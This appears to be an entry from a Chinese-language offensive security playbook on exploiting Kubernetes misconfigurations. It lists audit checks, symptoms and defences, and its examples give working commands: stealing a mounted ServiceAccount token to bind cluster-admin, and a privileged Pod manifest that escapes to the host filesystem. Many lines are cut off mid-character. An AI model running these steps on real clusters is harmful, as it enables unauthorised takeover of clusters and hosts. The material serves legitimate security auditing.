# Kubernetes Cluster Misconfiguration Exploitation

**ID**: `k8s-misconfig-001` | **分类**: kubernetes | **风险等级**: critical

Kubernetes 配置审计和利用技术用于发现集群中不安全的配置，并通过 RBAC 权限提升、Pod 逃逸等技术获取更高权限。K8s 配置复杂，常见错误包括API Server 暴露、RBAC 过度授权、Pod 安全策略缺失等

## 触发场景

- 发现 Kubernetes API Server 未授权访
- ServiceAccount 权限配置过高
- Pod 以特权模式运
- ClusterRole 绑定过于宽松
- etcd 未加密或可匿名访问

## 操作检查清单

1. 检查 API Server 认证和授权配
2. 检查 RBAC 角色和角色绑定定
3. 检查 ServiceAccount 配置的 token 挂载
4. 检查 Pod 安全配置 (securityContext)
5. 检查网络策略(NetworkPolicy)
6. 检查 etcd 加密配置
7. 检查 kubelet 配置
8. 检查 admission controllers

## 技术手段

- ServiceAccount token 提取和使
- RBAC 权限提升 (escalate, bind, impersonate)
- 特权 Pod 创建和宿主机挂载
- kubelet API 匿名访问利用
- etcd 数据提取
- 网络策略绕过

## 症状

- API Server 可匿名访问或接受默认凭据
- ServiceAccount 自动挂载到Pod
- Pod ?root 用户运行
- ClusterRoleBinding 授予过宽权限
- NetworkPolicy 未限制 Pod 间通信

## 根因分析

- RBAC 配置过于宽松，授予不必要的权
- API Server 未启用认证或授权
- 缺少 Pod 安全策略 (PSP) ?PodSecurity Admission
- etcd 数据未加
- kubelet 启用了匿名认
- 默认命名空间未做安全加固

## 示例

### ServiceAccount Token 权限提升

利用挂载到Pod ?ServiceAccount token 访问 K8s API

```
# 提取 token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
# 列出可访问的资源
kubectl --token=$TOKEN auth can-i --list
# 尝试创建新的 ClusterRoleBinding
kubectl --token=$TOKEN create clusterrolebinding admin --clusterrole=cluster-admin --user=default
```

### 特权 Pod 逃

创建特权 Pod 挂载宿主机根文件系统

```
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["chroot", "/host", "/bin/sh"]
    volumeMounts:
    - name: host-fs
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host-fs
    hostPath:
      path: /

```

## 成功标志

- kubectl auth can-i 返回 yes
- 成功创建 ClusterRoleBinding
- Pod 可以挂载宿主机文件系统

## 防御建议

- 启用并配置 RBAC 严格模式
- 禁用匿名认证
- 配置 PodSecurity Admission 限制特权 Pod
- 加密 etcd 数据
- 实施 NetworkPolicy 限制 Pod 通信
- 禁用 ServiceAccount token 自动挂载
- 定期审计 RBAC 配置
